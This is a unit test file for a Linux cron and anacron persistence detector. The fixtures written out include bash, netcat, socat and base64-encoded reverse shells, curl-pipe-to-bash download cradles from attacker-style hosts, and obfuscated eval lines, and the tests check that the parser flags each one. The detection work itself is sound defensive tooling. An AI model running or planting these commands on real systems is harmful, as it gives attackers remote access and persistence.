# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for the Linux Cron & Anacron Persistence Parser submodule."""

from __future__ import annotations

from pathlib import Path

from src.utils.linux_cron import (
    LinuxCronParser,
    analyze_cron,
    extract_and_decode_base64,
)
from src.utils.models import AnalysisTarget, RiskLevel


def test_extract_and_decode_base64():
    """Test base64 payload extraction and decoding helper."""
    # Pipe syntax
    cmd1 = "echo 'ZXhhbXBsZSBjb21tYW5k' | base64 -d | sh"
    raw1, dec1 = extract_and_decode_base64(cmd1)
    assert raw1 == "ZXhhbXBsZSBjb21tYW5k"
    assert dec1 == "example command"

    # Reverse shell payload in base64
    cmd2 = (
        'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash'
    )
    raw2, dec2 = extract_and_decode_base64(cmd2)
    assert raw2 == "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE="
    assert dec2 == "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

    # Base64 with here-string
    cmd3 = 'base64 -d <<< "c3Vkb2ZpbGVfdGVzdA==" | sh'
    raw3, dec3 = extract_and_decode_base64(cmd3)
    assert raw3 == "c3Vkb2ZpbGVfdGVzdA=="
    assert dec3 == "sudofile_test"

    # Base64 in Python b64decode
    cmd4 = "python3 -c \"import base64; exec(base64.b64decode('cHJpbnQoJ2hpJyk='))\""
    raw4, dec4 = extract_and_decode_base64(cmd4)
    assert raw4 == "cHJpbnQoJ2hpJyk="
    assert dec4 == "print('hi')"

    # Base64 mentioned with quoted string
    cmd5 = "sh -c 'echo \"ZWNobyAnbWFsaWNpb3VzJyE=\" | base64 --decode | bash'"
    raw5, dec5 = extract_and_decode_base64(cmd5)
    assert raw5 == "ZWNobyAnbWFsaWNpb3VzJyE="
    assert dec5 == "echo 'malicious'!"

    # Standalone high-length base64
    cmd6 = "eval YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE="
    raw6, dec6 = extract_and_decode_base64(cmd6)
    assert raw6 == "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE="
    assert dec6 == "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

    # Normal command without base64
    raw_none, dec_none = extract_and_decode_base64("/usr/bin/find /tmp -type f -delete")
    assert raw_none is None
    assert dec_none is None


def test_system_crontab_standard(tmp_path: Path):
    """Test parsing standard system /etc/crontab."""
    crontab_content = """# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
"""
    crontab_file = tmp_path / "crontab"
    crontab_file.write_text(crontab_content)

    target = AnalysisTarget(virtual_paths={"/etc/crontab": str(crontab_file)})
    findings = analyze_cron(target)

    assert len(findings) == 2

    f1 = findings[0]
    assert f1.category == "cron_job"
    assert f1.risk_level == RiskLevel.INFO
    assert f1.technique_id == "T1053.003"
    assert f1.path == "/etc/crontab"
    assert f1.details["schedule"] == "17 * * * *"
    assert f1.details["user"] == "root"
    assert "run-parts" in f1.details["command"]
    assert f1.details["flags"] == []

    f2 = findings[1]
    assert f2.details["schedule"] == "25 6 * * *"
    assert f2.details["user"] == "root"
    assert f2.risk_level == RiskLevel.INFO


def test_system_crontab_cross_boundary(tmp_path: Path):
    """Test /etc/crontab pointing to user home directory."""
    crontab_content = """
0 2 * * * root /home/deploy/scripts/backup.sh --full
"""
    crontab_file = tmp_path / "crontab"
    crontab_file.write_text(crontab_content)

    target = AnalysisTarget(virtual_paths={"/etc/crontab": str(crontab_file)})
    findings = analyze_cron(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.category == "cross_boundary_cron"
    assert f.risk_level == RiskLevel.CRITICAL
    assert "SYSTEM_CRON_POINTS_TO_USER_HOME" in f.details["flags"]
    assert "NON_ROOT_USER_PATH" in f.details["flags"]
    assert f.details["target_binary_owner"] == "deploy"
    assert f.details["target_binary_path"] == "/home/deploy/scripts/backup.sh"


def test_cron_d_reboot_and_tmp_execution(tmp_path: Path):
    """Test /etc/cron.d/* with @reboot persistence and execution from /tmp."""
    reboot_job = tmp_path / "reboot_job"
    reboot_job.write_text("@reboot root /usr/local/bin/agent_check\n")

    tmp_job = tmp_path / "tmp_job"
    tmp_job.write_text("* * * * * root /tmp/.hidden_dir/miner --daemon\n")

    target = AnalysisTarget(
        virtual_paths={
            "/etc/cron.d/reboot_job": str(reboot_job),
            "/etc/cron.d/tmp_job": str(tmp_job),
        }
    )
    findings = analyze_cron(target)

    assert len(findings) == 2

    # Map by path
    findings_by_path = {f.path: f for f in findings}

    f_reboot = findings_by_path["/etc/cron.d/reboot_job"]
    assert f_reboot.details["schedule"] == "@reboot"
    assert f_reboot.details["user"] == "root"
    assert "REBOOT_PERSISTENCE" in f_reboot.details["flags"]
    assert f_reboot.risk_level == RiskLevel.MEDIUM

    f_tmp = findings_by_path["/etc/cron.d/tmp_job"]
    assert f_tmp.details["schedule"] == "* * * * *"
    assert "EXEC_FROM_TMP_OR_DEV_SHM" in f_tmp.details["flags"]
    assert "HIDDEN_PATH_EXECUTION" in f_tmp.details["flags"]
    assert "CRON_SCHEDULE_HIGH_FREQUENCY" in f_tmp.details["flags"]
    assert f_tmp.risk_level == RiskLevel.HIGH


def test_user_crontab_reverse_shell(tmp_path: Path):
    """Test /var/spool/cron/crontabs/root reverse shell detection."""
    root_cron = tmp_path / "root"
    root_cron.write_text("* * * * * /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n")

    target = AnalysisTarget(
        virtual_paths={"/var/spool/cron/crontabs/root": str(root_cron)}
    )
    findings = analyze_cron(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.details["user"] == "root"
    assert f.details["schedule"] == "* * * * *"
    assert "REVERSE_SHELL_PATTERN" in f.details["flags"]
    assert "CRON_SCHEDULE_HIGH_FREQUENCY" in f.details["flags"]
    assert f.risk_level == RiskLevel.CRITICAL


def test_user_crontab_base64_payload(tmp_path: Path):
    """Test /var/spool/cron/crontabs/alice with base64 encoded command."""
    alice_cron = tmp_path / "alice"
    alice_cron.write_text("0 * * * * echo 'ZXhhbXBsZSBjb21tYW5k' | base64 -d | sh\n")

    target = AnalysisTarget(
        virtual_paths={"/var/spool/cron/crontabs/alice": str(alice_cron)}
    )
    findings = analyze_cron(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.details["user"] == "alice"
    assert "BASE64_PAYLOAD" in f.details["flags"]
    assert "OBFUSCATED_COMMAND" in f.details["flags"]
    assert f.decoded_payload == "example command"
    assert f.risk_level == RiskLevel.HIGH


def test_user_crontab_base64_with_reverse_shell(tmp_path: Path):
    """Test encoded reverse shell inside /var/spool/cron/bob."""
    bob_cron = tmp_path / "bob"
    bob_cron.write_text(
        '* * * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash\n'
    )

    target = AnalysisTarget(virtual_paths={"/var/spool/cron/bob": str(bob_cron)})
    findings = analyze_cron(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.decoded_payload == "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    assert "BASE64_PAYLOAD" in f.details["flags"]
    assert "REVERSE_SHELL_PATTERN" in f.details["flags"]
    assert f.risk_level == RiskLevel.CRITICAL


def test_user_crontab_clean_user_vs_root_cross_boundary(tmp_path: Path):
    """Test user crontab running in user home is INFO, but root running in user home is CRITICAL."""
    john_cron = tmp_path / "john"
    john_cron.write_text("0 3 * * * /home/john/clean.sh\n")

    root_cron = tmp_path / "root"
    root_cron.write_text("0 3 * * * /home/john/clean.sh\n")

    target_john = AnalysisTarget(
        virtual_paths={"/var/spool/cron/crontabs/john": str(john_cron)}
    )
    findings_john = analyze_cron(target_john)
    assert len(findings_john) == 1
    assert findings_john[0].category == "cron_job"
    assert findings_john[0].risk_level == RiskLevel.INFO
    assert "SYSTEM_CRON_POINTS_TO_USER_HOME" not in findings_john[0].details["flags"]

    target_root = AnalysisTarget(
        virtual_paths={"/var/spool/cron/crontabs/root": str(root_cron)}
    )
    findings_root = analyze_cron(target_root)
    assert len(findings_root) == 1
    assert findings_root[0].category == "cross_boundary_cron"
    assert findings_root[0].risk_level == RiskLevel.CRITICAL
    assert "SYSTEM_CRON_POINTS_TO_USER_HOME" in findings_root[0].details["flags"]
    assert "NON_ROOT_USER_PATH" in findings_root[0].details["flags"]


def test_anacrontab_parsing(tmp_path: Path):
    """Test /etc/anacrontab entries: normal, download cradle, and cross-boundary."""
    anacrontab_content = """# /etc/anacrontab: configuration file for anacron
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# period delay job-identifier command
1 5 cron.daily run-parts --report /etc/cron.daily
7 10 download_job curl -s http://attacker.internal/stage2.sh | bash
1 15 user_cross /home/alice/bin/hourly_sync
"""
    anacron_file = tmp_path / "anacrontab"
    anacron_file.write_text(anacrontab_content)

    target = AnalysisTarget(virtual_paths={"/etc/anacrontab": str(anacron_file)})
    findings = analyze_cron(target)

    assert len(findings) == 3

    # Finding 1: standard run-parts
    f1 = findings[0]
    assert f1.category == "anacron_job"
    assert f1.risk_level == RiskLevel.INFO
    assert f1.details["job_id"] == "cron.daily"
    assert f1.details["period"] == "1"
    assert f1.details["delay"] == "5"

    # Finding 2: download cradle
    f2 = findings[1]
    assert f2.category == "anacron_job"
    assert f2.risk_level == RiskLevel.HIGH
    assert "DOWNLOAD_CRADLE" in f2.details["flags"]
    assert f2.details["job_id"] == "download_job"

    # Finding 3: cross-boundary home execution
    f3 = findings[2]
    assert f3.category == "cross_boundary_cron"
    assert f3.risk_level == RiskLevel.CRITICAL
    assert "SYSTEM_CRON_POINTS_TO_USER_HOME" in f3.details["flags"]
    assert "NON_ROOT_USER_PATH" in f3.details["flags"]
    assert f3.details["target_binary_owner"] == "alice"


def test_periodic_cron_script_reverse_shell_and_tmp(tmp_path: Path):
    """Test /etc/cron.hourly/* script with netcat/mkfifo reverse shell."""
    script_content = """#!/bin/bash
# Hourly sync
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
"""
    script_file = tmp_path / "sync-helper"
    script_file.write_text(script_content)

    target = AnalysisTarget(
        virtual_paths={"/etc/cron.hourly/sync-helper": str(script_file)}
    )
    findings = analyze_cron(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.category == "cron_script"
    assert f.risk_level == RiskLevel.CRITICAL
    assert f.details["schedule"] == "hourly"
    assert f.details["user"] == "root"
    assert "REVERSE_SHELL_PATTERN" in f.details["flags"]
    assert "EXEC_FROM_TMP_OR_DEV_SHM" in f.details["flags"]


def test_periodic_cron_script_download_cradle(tmp_path: Path):
    """Test /etc/cron.daily/* script with curl piped to sh."""
    script_content = """#!/bin/sh
curl -s http://example.com/miner.sh | sh
"""
    script_file = tmp_path / "cleanup"
    script_file.write_text(script_content)

    target = AnalysisTarget(virtual_paths={"/etc/cron.daily/cleanup": str(script_file)})
    findings = analyze_cron(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.category == "cron_script"
    assert f.risk_level == RiskLevel.HIGH
    assert f.details["schedule"] == "daily"
    assert "DOWNLOAD_CRADLE" in f.details["flags"]


def test_periodic_cron_script_cross_boundary_symlink(tmp_path: Path):
    """Test /etc/cron.weekly/* symlink resolving to user home directory."""
    user_script = tmp_path / "user_script.sh"
    user_script.write_text("#!/bin/bash\necho hello\n")

    # In virtual target, simulate symlink resolution
    target = AnalysisTarget(
        virtual_paths={"/etc/cron.weekly/maintenance": str(user_script)}
    )
    # Mock resolve_symlink for this virtual path
    target.resolve_symlink = lambda p: (  # type: ignore
        "/home/dev/user_script.sh" if p == "/etc/cron.weekly/maintenance" else None
    )

    findings = analyze_cron(target)
    assert len(findings) == 1
    f = findings[0]
    assert f.category == "cross_boundary_cron"
    assert f.risk_level == RiskLevel.CRITICAL
    assert "SYSTEM_CRON_POINTS_TO_USER_HOME" in f.details["flags"]
    assert "NON_ROOT_USER_PATH" in f.details["flags"]
    assert f.details["symlink_target"] == "/home/dev/user_script.sh"


def test_full_filesystem_tree(tmp_path: Path):
    """Test parser using root_path on an actual directory hierarchy."""
    root_dir = tmp_path / "rootfs"
    root_dir.mkdir()

    # /etc/crontab
    etc_dir = root_dir / "etc"
    etc_dir.mkdir()
    (etc_dir / "crontab").write_text(
        "0 1 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n"
    )

    # /etc/cron.d/
    cron_d = etc_dir / "cron.d"
    cron_d.mkdir()
    (cron_d / "socat_backdoor").write_text(
        "* * * * * root socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444\n"
    )

    # /etc/cron.monthly/
    cron_monthly = etc_dir / "cron.monthly"
    cron_monthly.mkdir()
    (cron_monthly / "clean").write_text("#!/bin/sh\nrm -rf /var/log/*.old\n")

    # /var/spool/cron/crontabs/
    spool_dir = root_dir / "var" / "spool" / "cron" / "crontabs"
    spool_dir.mkdir(parents=True)
    (spool_dir / "root").write_text("@reboot /home/attacker/.hidden_payload/run.sh\n")

    target = AnalysisTarget(root_path=str(root_dir))
    findings = analyze_cron(target)

    # We expect:
    # 1. /etc/crontab -> INFO
    # 2. /etc/cron.d/socat_backdoor -> CRITICAL (REVERSE_SHELL_PATTERN)
    # 3. /etc/cron.monthly/clean -> INFO
    # 4. /var/spool/cron/crontabs/root -> CRITICAL (SYSTEM_CRON_POINTS_TO_USER_HOME, REBOOT_PERSISTENCE, HIDDEN_PATH_EXECUTION)
    assert len(findings) == 4

    findings_by_vpath = {f.path: f for f in findings}

    assert "/etc/crontab" in findings_by_vpath
    assert findings_by_vpath["/etc/crontab"].risk_level == RiskLevel.INFO

    assert "/etc/cron.d/socat_backdoor" in findings_by_vpath
    socat_finding = findings_by_vpath["/etc/cron.d/socat_backdoor"]
    assert socat_finding.risk_level == RiskLevel.CRITICAL
    assert "REVERSE_SHELL_PATTERN" in socat_finding.details["flags"]

    assert "/etc/cron.monthly/clean" in findings_by_vpath
    assert findings_by_vpath["/etc/cron.monthly/clean"].risk_level == RiskLevel.INFO

    assert "/var/spool/cron/crontabs/root" in findings_by_vpath
    root_finding = findings_by_vpath["/var/spool/cron/crontabs/root"]
    assert root_finding.risk_level == RiskLevel.CRITICAL
    assert root_finding.category == "cross_boundary_cron"
    assert "SYSTEM_CRON_POINTS_TO_USER_HOME" in root_finding.details["flags"]
    assert "REBOOT_PERSISTENCE" in root_finding.details["flags"]
    assert "HIDDEN_PATH_EXECUTION" in root_finding.details["flags"]


def test_parser_class_interface(tmp_path: Path):
    """Test using LinuxCronParser class directly."""
    crontab_file = tmp_path / "crontab"
    crontab_file.write_text("0 0 * * * root /bin/true\n")
    target = AnalysisTarget(virtual_paths={"/etc/crontab": str(crontab_file)})

    parser = LinuxCronParser()
    findings = parser.parse(target)
    assert len(findings) == 1
    assert findings[0].details["command"] == "/bin/true"


def test_user_crontab_special_schedule(tmp_path: Path):
    """Test user crontab with @hourly and malformed short lines."""
    user_cron = tmp_path / "guest"
    user_cron.write_text(
        "@hourly /usr/local/bin/check_updates\n"
        "0 0 * * *\n"  # 5 fields without command
        "malformed\n"
    )

    target = AnalysisTarget(
        virtual_paths={"/var/spool/cron/crontabs/guest": str(user_cron)}
    )
    findings = analyze_cron(target)
    assert len(findings) == 2
    assert findings[0].details["schedule"] == "@hourly"
    assert findings[0].details["command"] == "/usr/local/bin/check_updates"
    assert findings[1].details["schedule"] == "0 0 * * *"
    assert findings[1].details["command"] == ""


def test_system_crontab_fallback_variations(tmp_path: Path):
    """Test system crontab with missing user fields falling back to root."""
    crontab_content = """
@reboot /usr/local/bin/headless_daemon
0 0 * * * /usr/bin/daily_task
"""
    crontab_file = tmp_path / "crontab"
    crontab_file.write_text(crontab_content)

    target = AnalysisTarget(virtual_paths={"/etc/crontab": str(crontab_file)})
    findings = analyze_cron(target)
    assert len(findings) == 2
    assert findings[0].details["user"] == "root"
    assert findings[0].details["command"] == "/usr/local/bin/headless_daemon"
    assert findings[1].details["user"] == "root"
    assert findings[1].details["command"] == "/usr/bin/daily_task"


def test_obfuscation_patterns(tmp_path: Path):
    """Test detection of hex/eval/IFS obfuscation in cron jobs."""
    cron_content = """
* * * * * root eval $'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68'
"""
    crontab_file = tmp_path / "crontab"
    crontab_file.write_text(cron_content)

    target = AnalysisTarget(virtual_paths={"/etc/crontab": str(crontab_file)})
    findings = analyze_cron(target)
    assert len(findings) == 1
    assert "OBFUSCATED_COMMAND" in findings[0].details["flags"]
    assert findings[0].risk_level == RiskLevel.HIGH


def test_empty_or_nonexistent_crontabs(tmp_path: Path):
    """Test that empty or non-existent files are handled without errors."""
    empty_file = tmp_path / "empty"
    empty_file.write_text("")

    whitespace_file = tmp_path / "whitespace"
    whitespace_file.write_text("   \n\n\t  \n")

    target = AnalysisTarget(
        virtual_paths={
            "/etc/crontab": str(empty_file),
            "/etc/cron.daily/empty": str(whitespace_file),
        }
    )
    findings = analyze_cron(target)
    assert findings == []
